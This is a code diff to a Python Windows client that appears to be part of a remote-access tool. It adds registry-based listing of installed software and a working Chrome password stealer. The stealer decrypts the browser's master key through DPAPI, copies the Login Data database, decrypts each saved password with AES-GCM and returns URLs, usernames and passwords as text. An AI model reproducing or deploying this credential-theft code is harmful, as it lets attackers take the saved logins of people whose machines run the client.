@@ -1,9 +1,13 @@
 # coding=utf-8
+import base64
 import ctypes
 import inspect
+import json
 import locale
 import os
+import shutil
 import socket
+import sqlite3
 import struct
 import subprocess
 import sys
@@ -23,11 +27,13 @@ import pythoncom
 import win32api
 import win32clipboard
 import win32con
+import win32crypt
 import win32process
 import win32profile
 import win32security
 import win32service
 import win32ts
+from Crypto.Cipher import AES
 
 
 class Client(object):
@@ -410,6 +416,28 @@ class ClientUtil:
         except Exception as exception:
             return '[-] Error: ' + str(exception)
 
+    @staticmethod
+    def list_software():
+        try:
+            software_list = get_software_list(winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_32KEY) + get_software_list(
+                winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_64KEY) + get_software_list(winreg.HKEY_CURRENT_USER, 0)
+            software_list.sort()
+            width = [max(map(len, col)) for col in zip(*software_list)]
+            result = ''
+            for software in software_list:
+                result += ' '.join(val.ljust(width) for val, width in zip(software, width)) + '\n'
+            result += 'Number of installed apps: ' + str(len(software_list))
+            return result
+        except Exception as exception:
+            return '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def chrome_password():
+        try:
+            return get_password()
+        except Exception as exception:
+            return '[-] Error: ' + str(exception)
+
 
 def get_time():
     return str(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()))
@@ -560,6 +588,74 @@ def create_process_as_admin():
     environment = win32profile.CreateEnvironmentBlock(admin_token, False)
     win32process.CreateProcessAsUser(admin_token, executable_path, None, None, None, False,
                                      creation_flags, environment, None, win32process.STARTUPINFO())
+
+
+def get_software_list(hive, flag):
+    reg = winreg.ConnectRegistry(None, hive)
+    key = winreg.OpenKey(reg,
+                         r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 0,
+                         winreg.KEY_READ | flag)
+    subkey = winreg.QueryInfoKey(key)[0]
+    software_list = []
+    for i in range(subkey):
+        software = {}
+        try:
+            subkey_name = winreg.EnumKey(key, i)
+            subkey = winreg.OpenKey(key, subkey_name)
+            software['name'] = winreg.QueryValueEx(subkey, 'DisplayName')[0]
+            try:
+                software['version'] = winreg.QueryValueEx(subkey, 'DisplayVersion')[0]
+            except EnvironmentError:
+                software['version'] = 'undefined'
+            try:
+                software['publisher'] = winreg.QueryValueEx(subkey, 'Publisher')[0]
+            except EnvironmentError:
+                software['publisher'] = 'undefined'
+            software_list.append(list(software.values()))
+        except EnvironmentError:
+            continue
+    return software_list
+
+
+def get_master_key():
+    file = os.path.expanduser('~') + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State'
+    with open(file, 'r') as f:
+        local_state = json.loads(f.read().replace('\\', '\\\\'))
+        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
+        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+
+
+def decrypt_password(buf, master_key):
+    try:
+        iv = buf[3:15]
+        payload = buf[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        password = cipher.decrypt(payload)
+        password = password[:-16].decode()
+        return password
+    except:
+        return None
+
+
+def get_password():
+    master_key = get_master_key()
+    db = os.path.expanduser('~') + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
+    shutil.copy2(db, 'vault.db')
+    conn = sqlite3.connect('vault.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+    result = ''
+    for r in cursor.fetchall():
+        url = r[0]
+        username = r[1]
+        password = decrypt_password(r[2], master_key)
+        if username and password:
+            result += 'URL: ' + url + '\nUsername: ' + username + '\nPassword: ' + password + '\n\n'
+    cursor.close()
+    conn.close()
+    if os.path.isfile('vault.db'):
+        os.remove('vault.db')
+    return result
 
 
 while True:
